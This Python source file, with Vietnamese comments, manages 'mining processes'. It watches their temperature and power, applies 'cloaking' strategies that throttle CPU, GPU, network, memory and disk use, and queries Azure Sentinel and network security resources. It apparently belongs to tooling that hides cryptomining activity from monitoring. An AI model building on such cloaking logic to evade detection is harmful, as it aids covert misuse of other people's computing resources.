# resource_manager.py

import os
import logging
import psutil
import pynvml
import traceback
import asyncio
from asyncio import Queue as AsyncQueue, Event
from typing import List, Any, Dict, Optional, Tuple
from itertools import count
from contextlib import asynccontextmanager
from threading import Lock  # Giữ lại Lock cho Singleton

from readerwriterlock import rwlock

# Import các module phụ trợ từ dự án
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategy, CloakStrategyFactory
from .resource_control import ResourceControlFactory  # Import ResourceControlFactory

# Import Interface
from .interfaces import IResourceManager

# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    AzureAnomalyDetectorClient
    # Đã bỏ AzureTrafficAnalyticsClient, AzureOpenAIClient
)

from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)

import aiofiles  # Thêm aiofiles để xử lý I/O bất đồng bộ

###############################################################################
#                     BỔ SUNG: EVENT-DRIVEN & WATCHER MODULE                  #
###############################################################################

@asynccontextmanager
async def acquire_lock_with_timeout(lock: rwlock.RWLockFair, lock_type: str, timeout: float):
    """
    Async context manager để chiếm khóa với timeout.
    Cách dùng tương tự như trước, nhưng ta giữ nguyên để dùng chung.
    """
    if lock_type == 'read':
        acquired_lock = lock.gen_rlock()
    elif lock_type == 'write':
        acquired_lock = lock.gen_wlock()
    else:
        raise ValueError("lock_type phải là 'read' hoặc 'write'.")

    try:
        await asyncio.wait_for(acquired_lock.acquire(), timeout=timeout)
        try:
            yield acquired_lock
        finally:
            acquired_lock.release()
    except asyncio.TimeoutError:
        yield None


class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    Tích hợp với ResourceControlFactory để quản lý resource managers.

    *Điểm mới*: 
    - Vẫn giữ nguyên các hàm điều chỉnh/cloaking/restore,
      nhưng được gọi bởi cơ chế event-driven từ các watcher.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo SharedResourceManager với cấu hình và logger.
        """
        self.config = config
        self.logger = logger
        self.gpu_manager = GPUManager()
        self.power_manager = PowerManager()
        self.strategy_cache = {}  # Cache cho các chiến lược cloaking

        # Khởi tạo resource managers
        self.resource_managers = ResourceControlFactory.create_resource_managers(self.logger)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU đã được khởi tạo hay chưa.
        """
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    async def shutdown_nvml(self):
        """
        Đóng NVML khi không cần thiết (gọi khi shutdown toàn bộ).
        """
        self.gpu_manager.shutdown_nvml()

    ##########################################################################
    #                 HÀM HỖ TRỢ LẤY THÔNG TIN USAGE ASYNC                  #
    ##########################################################################
    async def get_process_cache_usage(self, pid: int) -> float:
        """
        Lấy usage cache của tiến trình từ /proc/[pid]/status (bất đồng bộ).
        """
        try:
            status_file = f"/proc/{pid}/status"
            async with aiofiles.open(status_file, 'r') as f:
                async for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])  # Lấy giá trị kB
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
            return 0.0

    async def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID (bất đồng bộ).
        """
        try:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, self._sync_get_gpu_usage_percent, pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """
        Phương thức đồng bộ để lấy GPU usage, gọi từ async context.
        """
        try:
            pynvml.nvmlInit()
            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu
            pynvml.nvmlShutdown()

            if gpu_present:
                return total_gpu_usage
            else:
                return 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    ##########################################################################
    #               HÀM APPLY/RESTORE CHIẾN LƯỢC & TÀI NGUYÊN                #
    ##########################################################################
    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng 1 chiến lược cloaking cho tiến trình đã cho.
        """
        try:
            pid = process.pid
            name = process.name

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )

            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} không có hàm 'apply'.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi cloaking '{strategy_name}' cho {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên cho tiến trình đã cloaked.
        Gọi bởi event-driven khi đủ điều kiện an toàn để khôi phục.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            # Khôi phục resource qua các resource_managers
            for controller, manager in self.resource_managers.items():
                success = await asyncio.get_event_loop().run_in_executor(None, manager.restore_resources, pid)
                if success:
                    self.logger.info(f"Đã khôi phục tài nguyên '{controller}' cho PID={pid}.")
                    restored = True
                else:
                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller}' cho PID={pid}.")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID: {pid}).")
        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục tài nguyên cho tiến trình {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
            )
            raise


###############################################################################
#                      LỚP CHÍNH: ResourceManager (SINGLETON)                 #
###############################################################################


class ResourceManager(BaseManager, IResourceManager):
    """
    Lớp quản lý tài nguyên hệ thống, giám sát và điều chỉnh tài nguyên cho các tiến trình khai thác.
    Áp dụng mô hình event-driven: 
      - Các watcher (nhiệt độ, công suất, ...) chạy ngầm và phát sinh sự kiện.
      - ResourceManager lắng nghe (consume) sự kiện từ queue và áp dụng cloak/restore.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        BaseManager.__init__(self, config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        # Sự kiện để dừng ResourceManager
        self.stop_event = Event()

        # Lock bảo vệ shared data
        self.resource_lock = rwlock.RWLockFair()

        # Hàng đợi chính để nhận các event điều chỉnh tài nguyên
        self.resource_adjustment_queue = AsyncQueue()

        # Set lưu task đã xử lý (tránh trùng lặp)
        self.processed_tasks = set()

        # Danh sách các tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()
        self._counter = count()

        # Khởi tạo Azure Clients
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Khởi tạo SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger)

        # Bổ sung: Danh sách watchers
        self.watchers = []


    ##########################################################################
    #             KHỞI TẠO/SHUTDOWN & AZURE CLIENT LIÊN QUAN                 #
    ##########################################################################

    async def is_gpu_initialized(self) -> bool:
        """
        Override phương thức trừu tượng trong IResourceManager.
        """
        return self.shared_resource_manager.is_gpu_initialized()


    def initialize_azure_clients(self):
        """
        Khởi tạo các Azure Client cần thiết.
        """
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)

    def discover_azure_resources(self):
        """
        Khám phá các tài nguyên Azure.
        """
        try:
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            # Đã bỏ việc khám phá Traffic Analytics
            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")
        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #          TÌM VÀ CẬP NHẬT DANH SÁCH TIẾN TRÌNH KHAI THÁC               #
    ##########################################################################

    async def discover_mining_processes_async(self):
        """
        Tìm các tiến trình khai thác đang chạy trên hệ thống, dựa trên config.
        """
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                if write_lock is None:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.get('network_interface', 'eth0')
                            mining_proc = MiningProcess(
                                proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                            )
                            self.mining_processes.append(mining_proc)
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue

                self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên (giữ nguyên logic cũ).
        """
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải là int => gán = 1."
            )
            return 1
        return pri_val

    ##########################################################################
    #                   EVENT QUEUE: ENQUEUE CLOAKING/RESTORE                #
    ##########################################################################

    async def enqueue_cloaking(self, process: MiningProcess):
        """
        Thêm tiến trình vào hàng đợi (queue) để cloaking.
        """
        try:
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
            }
            # Cloaking ưu tiên cao (priority=1)
            priority = 1
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue yêu cầu cloaking cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """
        Thêm tiến trình vào hàng đợi để khôi phục tài nguyên.
        """
        try:
            task = {
                'type': 'restoration',
                'process': process
            }
            # Restoration ưu tiên thấp hơn (priority=2)
            priority = 2
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue yêu cầu khôi phục tài nguyên cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue khôi phục tài nguyên cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                         THU THẬP METRICS ASYNC                          #
    ##########################################################################

    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics cho 1 tiến trình, gọi bởi AnomalyDetector hoặc watchers.
        """
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)

            if self.shared_resource_manager.is_gpu_initialized():
                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
            else:
                gpu_pct = 0.0

            # Ví dụ disk I/O (mock): 
            disk_mbps = await asyncio.get_event_loop().run_in_executor(
                None, temperature_monitor.get_current_disk_io_limit, process.pid
            )
            net_bw = float(self.config.get('resource_allocation', {})
                                      .get('network', {})
                                      .get('bandwidth_limit_mbps', 100.0))

            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)

            if 'memory' in self.shared_resource_manager.resource_managers:
                memory_limit_mb = self.shared_resource_manager.resource_managers['memory'].get_memory_limit(
                    process.pid
                ) / (1024**2)
            else:
                memory_limit_mb = 0.0

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': float(cache_l),
                'memory_limit_mb': float(memory_limit_mb)
            }

            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
            if invalid_metrics:
                self.logger.error(
                    f"Metrics PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Data: {metrics}"
                )
                return {}
            self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
            return metrics
        except psutil.NoSuchProcess:
            self.logger.warning(f"PID={process.pid} không tồn tại khi thu thập metrics.")
            return {}
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    async def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập metrics cho tất cả tiến trình khai thác, dùng cho tổng hợp nếu cần.
        """
        metrics_data = {}
        try:
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                if read_lock is None:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
                    return metrics_data

                tasks = []
                for proc in self.mining_processes:
                    tasks.append(self.collect_metrics(proc))
                results = await asyncio.gather(*tasks)

                for proc, metrics in zip(self.mining_processes, results):
                    if isinstance(metrics, dict):
                        metrics_data[str(proc.pid)] = metrics
                self.logger.debug(f"Collected metrics data: {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    ##########################################################################
    #                    TASK XỬ LÝ SỰ KIỆN TỪ HÀNG ĐỢI                      #
    ##########################################################################

    async def process_resource_adjustments(self):
        """
        Coroutine chính để xử lý các sự kiện cloaking/restoration trong resource_adjustment_queue.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = await asyncio.wait_for(self.resource_adjustment_queue.get(), timeout=1)
                if task['type'] == 'cloaking':
                    strategies = task['strategies']
                    for strategy in strategies:
                        # Áp dụng cloak
                        if strategy not in self.shared_resource_manager.strategy_cache:
                            strategy_instance = CloakStrategyFactory.create_strategy(
                                strategy,
                                self.config,
                                self.logger,
                                self.shared_resource_manager.resource_managers
                            )
                            self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                        else:
                            strategy_instance = self.shared_resource_manager.strategy_cache[strategy]

                        if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")
                            strategy_instance.apply(task['process'])
                        else:
                            self.logger.error(f"Không thể áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}")

                elif task['type'] == 'restoration':
                    await self.shared_resource_manager.restore_resources(task['process'])

                self.resource_adjustment_queue.task_done()

            except asyncio.TimeoutError:
                # Nếu queue trống, ta chờ timeout 1 giây rồi lặp
                continue
            except Exception as e:
                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                WATCHERS: GIÁM SÁT NHIỆT ĐỘ, CÔNG SUẤT, ...             #
    ##########################################################################

    async def temperature_watcher(self):
        """
        Thay vì polling liên tục trong 1 vòng lặp lớn,
        ta tách ra thành 1 coroutine (watcher) chuyên giám sát nhiệt độ CPU/GPU.
        Khi phát hiện quá ngưỡng => enqueue event cloaking.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        temp_lims = self.config.get("temperature_limits", {})
        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

        while not self.stop_event.is_set():
            try:
                # Cập nhật danh sách tiến trình
                await self.discover_mining_processes_async()

                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                    if read_lock is None:
                        self.logger.error("Timeout khi acquire mining_processes_lock trong temperature_watcher.")
                    else:
                        tasks = []
                        for proc in self.mining_processes:
                            tasks.append(self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp))
                        await asyncio.gather(*tasks)

            except Exception as e:
                self.logger.error(f"Lỗi temperature_watcher: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(temp_intv)

    async def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        """
        Kiểm tra nhiệt độ CPU/GPU và enqueue cloaking nếu vượt ngưỡng.
        """
        try:
            cpu_temp = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_cpu_temperature, process.pid)
            gpu_temps = None

            if self.shared_resource_manager.is_gpu_initialized():
                gpu_temps = await asyncio.get_event_loop().run_in_executor(None, temperature_monitor.get_gpu_temperature, process.pid)

            # Nếu CPU temp vượt ngưỡng => enqueue
            if cpu_temp is not None and cpu_temp > cpu_max_temp:
                self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            # Nếu GPU temp (có thể là list) vượt ngưỡng => enqueue
            if gpu_temps and any(temp > gpu_max_temp for temp in gpu_temps):
                self.logger.warning(f"Nhiệt độ GPU {gpu_temps}°C > {gpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)

        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}\n{traceback.format_exc()}")

    async def power_watcher(self):
        """
        Watcher giám sát công suất CPU/GPU, nếu vượt ngưỡng => enqueue cloaking.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
        power_limits = self.config.get("power_limits", {})
        per_dev_power = power_limits.get("per_device_power_watts", {})
        cpu_max_pwr = per_dev_power.get("cpu", 150)
        gpu_max_pwr = per_dev_power.get("gpu", 300)

        while not self.stop_event.is_set():
            try:
                # Cập nhật danh sách tiến trình
                await self.discover_mining_processes_async()

                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                    if read_lock is None:
                        self.logger.error("Timeout khi acquire mining_processes_lock trong power_watcher.")
                    else:
                        tasks = []
                        for proc in self.mining_processes:
                            tasks.append(self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr))
                        await asyncio.gather(*tasks)

            except Exception as e:
                self.logger.error(f"Lỗi power_watcher: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(power_intv)

    async def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        """
        Kiểm tra công suất CPU/GPU của tiến trình và enqueue cloaking nếu vượt ngưỡng.
        """
        try:
            c_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
            g_power = 0.0

            if self.shared_resource_manager.is_gpu_initialized():
                g_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)

            if c_power > cpu_max_power:
                self.logger.warning(f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                if total_g_power > gpu_max_power:
                    self.logger.warning(f"GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid}).")
                    await self.enqueue_cloaking(process)
            else:
                if g_power > gpu_max_power:
                    self.logger.warning(f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid}).")
                    await self.enqueue_cloaking(process)

        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                     KHỞI TẠO WATCHERS & DỪNG RESOURCE MANAGER          #
    ##########################################################################
    
    async def start_watchers(self):
        """
        Hàm public để khởi động các watcher dưới dạng asyncio.Task.
        Gọi hàm này sau khi khởi tạo ResourceManager.
        """
        # Tạo task watchers
        self.watchers.append(asyncio.create_task(self.temperature_watcher()))
        self.watchers.append(asyncio.create_task(self.power_watcher()))
        # Nếu cần watchers khác, có thể append thêm

        # Tạo task xử lý sự kiện
        self.watchers.append(asyncio.create_task(self.process_resource_adjustments()))

        self.logger.info("Đã khởi chạy các watcher (temperature/power) và consumer (process_resource_adjustments).")

    async def shutdown(self):
        """
        Dừng ResourceManager, dừng toàn bộ watchers và khôi phục tài nguyên nếu cần.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()

        # Hủy watchers
        for w in self.watchers:
            w.cancel()
        await asyncio.gather(*self.watchers, return_exceptions=True)

        # Chờ queue rỗng, sau đó mới shutdown NVML
        await asyncio.sleep(1)
        await self.shared_resource_manager.shutdown_nvml()

        # Khôi phục tài nguyên cho tất cả tiến trình (nếu cần)
        tasks = []
        async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
            if read_lock is not None:
                for proc in self.mining_processes:
                    tasks.append(self.shared_resource_manager.restore_resources(proc))
        await asyncio.gather(*tasks)

        self.logger.info("ResourceManager đã dừng.")
        shutdown_power_management()
